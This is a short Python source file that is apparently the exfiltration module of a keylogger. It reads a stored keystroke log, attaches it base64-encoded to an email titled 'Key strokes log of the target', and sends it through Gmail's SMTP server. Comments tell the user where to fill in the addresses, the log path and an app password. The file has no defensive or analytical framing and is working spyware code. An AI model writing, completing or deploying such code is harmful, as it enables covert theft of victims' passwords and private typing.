import smtplib,ssl
from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

def compose_email(path:'str') ->'str':
    msg=MIMEMultipart()
    msg['From']="" #place the sender mail here
    msg['To']=""#place the reciever mail here
    msg['Subject']="Key strokes log of the target"
    msg.attach(MIMEText('','plain'))
    log_reader=None
    try:
        log_reader=open(path,'r') # put the path of the file where the keylogs are stored
        payload=MIMEBase('application','octet-stream')
        payload.set_payload(log_reader.read())
        encoders.encode_base64(payload)
        payload.add_header("Content-Disposition", f"attachment; filename= {'key_logging'}")
        msg.attach(payload)
        final_send=msg.as_string()
        log_reader.close()
        return final_send
    except FileNotFoundError:
        raise SystemExit("file not found")
    except:
        print("unknown error happened",flush=True)
def send_log(path:'str')->'None':
    try:
        context=ssl.create_default_context()
        server=smtplib.SMTP("smtp.gmail.com",port=587)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(user="",password="") #put your account email , and the app pass of the email (normal pass won`t work)
        server.sendmail("","",msg=compose_email(path)) #place the sender and reciever email
    except smtplib.SMTPAuthenticationError:
        raise SystemExit()